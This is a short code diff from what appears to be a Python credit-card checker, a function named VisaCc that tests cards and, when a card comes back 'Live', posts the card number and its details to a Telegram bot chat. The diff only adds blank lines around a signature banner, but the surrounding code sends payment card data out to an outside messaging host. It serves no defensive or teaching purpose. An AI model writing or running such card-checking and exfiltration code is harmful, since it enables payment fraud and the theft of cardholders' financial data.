@@ -72,9 +72,17 @@ def VisaCc(card, bb):
     if 'Live' in res:
         tlg = f"""
 card : {card}
+
+
 ♔♔♔♔♔♔ ST〆TAMIM࿐⁹⁹⁹⁺ ♔♔♔♔♔♔
+
+
 info : {bb}
+
+
 ♔♔♔♔♔♔ ST〆TAMIM࿐⁹⁹⁹⁺ ♔♔♔♔♔♔
+
+
         """
         print(F+tlg)
         requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}')
